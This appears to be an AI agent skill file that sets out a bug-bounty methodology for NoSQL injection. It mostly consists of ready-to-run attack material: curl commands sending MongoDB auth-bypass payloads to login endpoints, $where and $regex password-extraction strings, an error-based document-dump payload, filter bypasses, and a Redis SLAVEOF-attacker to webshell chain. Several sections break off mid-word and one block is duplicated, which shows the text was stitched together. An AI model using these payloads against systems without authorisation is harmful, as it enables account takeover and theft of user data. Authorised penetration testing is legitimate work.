---
name: bbhunt-nosqli
description: "Unified methodology for nosqli.. Unified from 2 upstream skills (cbh, hunting). For authorized security testing only."
agent_created: true
---

# Nosqli — unified methodology

> **Unified skill.** Built from 2 upstream skills across cbh, hunting. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method

### A. Discovery checklist — concrete places, params, headers, file types to look

- Two distinct classes to test separately: **syntax injection** (break a concatenated query / `$where` string) and **operator injection** (pass a JSON object where a scalar was expected). They need different payloads and different proof.
- Candidate surfaces: login/OTP/reset endpoints, category & filter params, search/lookup URLs, GraphQL resolvers, user/profile APIs, and anything forwarding values into `findOne`/`find`/`populate({match:})`.
- Stack signals: `X-Powered-By: Express`, `mongoose`/`monk` in JS bundles, MongoDB error strings, `:9200` (Elasticsearch), `:6379` (Redis), CouchDB `_utils`/Futon.
- Syntax-fuzz string from PortSwigger: `'`"`{<CR><LF>;$Foo}<CR><LF>$Foo \xYZ` — URL-encoded in query params, JSON-escaped (`\r`, `\n`, `\u0000`) in bodies. A response change indicates unfiltered input.
- Determine which characters are actually processed by injecting them individually; confirm with a valid escaped quote (`this.category == '\''`) — if that stops erroring, syntax injection is live.
- Operator detection in URL params uses bracket notation: `?username[$ne]=invalid&password[$ne]=invalid` — PHP's request parser and Express `qs` both turn this into nested objects.
- GraphQL variables declared `String!` can still carry objects if the resolver forwards them without runtime type checks — test `{"username":{"$ne":null}}` regardless of the schema annotation.
- Second-order flows: password-reset tokens, profile fields, and OTP codes that round-trip through storage before being used in a quer

### Signals and surfaces

### Crown Jewel Targets

NoSQL injection is most valuable when it bypasses authentication (Critical) or leaks the entire user collection (High).

**Highest-value chains:**
- **MongoDB auth bypass** — `{"username": {"$gt": ""}, "password": {"$gt": ""}}` logs in as first user in collection (usually admin)
- **$where JS injection** — if $where is enabled: blind injection → data exfil
- **Redis command injection** — via SSRF or direct TCP, SLAVEOF attacker-ip → config write → webshell
- **Elasticsearch injection** — _search endpoint with Groovy script injection (pre-5.0) → RCE

---

### Stack Signals

| Signal | Vector |
|--------|--------|
| MongoDB error messages in response | Operator injection |
| mongoose / monk in JS bundles | ODM patterns |
| X-Powered-By: Express | Node.js + MongoDB common stack |
| CouchDB/_utils UI exposed | Futon/Fauxton admin |
| Redis port 6379 open (via SSRF) | CONFIG SET / SLAVEOF |
| Elasticsearch :9200 open | Script injection |

---

### Techniques, payloads and bypasses

### Phase 1 — Auth Bypass (MongoDB)

```bash
# Operator injection in JSON body
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# Regex wildcard — match any username
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}'

# ne (not equal) bypass
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": "wrong"}}'

# in array bypass
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$in": ["admin","administrator","root"]}, "password": {"$ne": "x"}}'
```

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- Detection ladder: send `'`, `"`, `\`, `{`, `}`, `[`, `]`, `;`, `$` to any input; then `param[$ne]=xyz`, `param[$gt]=`, `param[$regex]=.*` (form) or `{"param":{"$ne":null}}`, `{"param":{"$gt":""}}`, `{"param":{"$regex":".*"}}` (JSON).
- Boolean confirmation: compare `Gifts' && 0 && 'x` (false) against `Gifts' && 1 && 'x` (true). Different responses confirm server-side query logic. Always-over-true `'||'1'=='1` returns everything — do not send this to update/delete endpoints (accidental data loss).
- Null truncation: `fizzy'%00` drops trailing conditions such as `&& this.released == 1`, revealing unreleased/private records.
- MongoDB auth bypass set: `{"username":{"$ne":null},"password":{"$ne":null}}`, `{"username":{"$gt":""},"password":{"$gt":""}}`, `{"username":{"$in":["admin","administrator","root"]},"password":{"$ne":""}}`.
- `$where` string-context breakout: `admin' || 'a'=='a`, `admin' && this.password[0]=='a' || 'a'=='b`, `admin' && this.password.match(/\d/) || 'a'=='b`.
- Field-name discovery: `admin' && this.password!='` vs `admin' && this.foo!='` — identical responses mean the field exists. Or `"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"` with a cluster-bomb Intruder attack.
- `$regex` char-by-char extraction without JS: `{"username":"admin","password":{"$regex":"^a"}}`; length oracle `{"password":{"$regex":"^.{8}$"}}`.
- Error-based exfil (when app leaks DB errors): `{"$where":"this.username=='bob' && this.password=='pwd'; throw new Error(JSON.stringify(this));"}`, paginate dete

### Bypass Table

| Defense | Bypass |
|---------|--------|
| JSON.parse rejects objects | Use array: `password[$ne]=x` (URL params) |
| Sanitizes `$` | Unicode: `$gt` |
| Blocks operator keys | Nested objects deeper in structure |

---

### Validation and proof

### Validation

✅ Auth bypass: logged in without valid credentials, received valid session token
✅ Data dump: returned users/documents you shouldn't have access to
✅ Blind injection: confirmed via time-delay (>4 seconds consistent)

**Severity:**
- Auth bypass as admin: Critical
- User collection dump: High
- Blind injection (no useful exfil): Medium

---

### C. Validation / proof bar — how to confirm and avoid false positives

- Establish a baseline first (status + body size); every operator test is a *difference* from that baseline. A generic 500 from malformed JSON is not injection.
- Confirm a true/false oracle pair before any char-by-char extraction: a condition that should match and one that cannot must produce different responses. If both look the same, there is no boolean oracle.
- Auth bypass proof requires a valid session token and access to a post-login resource — not just a changed error string such as "Account locked" (that only confirms the operator was applied).
- Time-based injections must be repeated 3× with a measured baseline; a single 5s response can be server load.
- `{"$ne":null}` matching every record can cause data loss if the same parameter reaches an update/delete operation — keep PoCs to read endpoints.
- Distinguish database-level JS from ODM-level JS: `$where` executing on `sift` (Mongoose `populate`) is RCE in the Node process — a materially different and higher-impact finding than MongoDB-level JS.
- Do not claim `$where` RCE on MongoDB 8.x without proving `javascriptEnabled` is true — infer it only from a successful conditional time/boolean test.
- CouchDB duplicate-key parser differentials (CVE-2017-12635/12636) are a different bug class — prove the privilege change, not just a stored duplicate key.
- Severity: auth bypass as admin / ODM $where RCE → Critical; full collection dump → High; blind operator injection with no useful data → Medium.

**Operator quick-reference table:**
- `$ne` — not

### Validation

✅ Auth bypass: logged in without valid credentials, received valid session token
✅ Data dump: returned users/documents you shouldn't have access to
✅ Blind injection: confirmed via time-delay (>4 seconds consistent)

**Severity:**
- Auth bypass as admin: Critical
- User collection dump: High
- Blind injection (no useful exfil): Medium

### Escalation and related chains

### Chain Table

| NoSQLi finding | Chain to | Impact |
|---------------|----------|--------|
| Auth bypass | Admin panel access | Full admin control |
| User enum via regex | Credential stuffing | Mass ATO |
| $where enabled | Arbitrary JS in DB process | Data exfil or DoS |
| Redis via SSRF | CONFIG SET / SLAVEOF | Webshell or data exfil |

---

## Source skills merged into this topic

- `hunting` — `nosqli`
- `cbh` — `hunt-nosqli`

## References

- `references/unified-method.md` — complete deduplicated union of all upstream sections
- `references/upstream-*.md` — full original SKILL.md from each contributing repo
- `references/upstream-assets/` — 1 companion files (payload/technique references, scripts, validators and schemas) from the contributing skills
- `references/unified-method.md` — includes 1 merged companion methodology documents
- `../../upstream/` — complete unmodified archives of all five source repositories
- `bbhunt-methodology` — orchestrator, state machine and class router
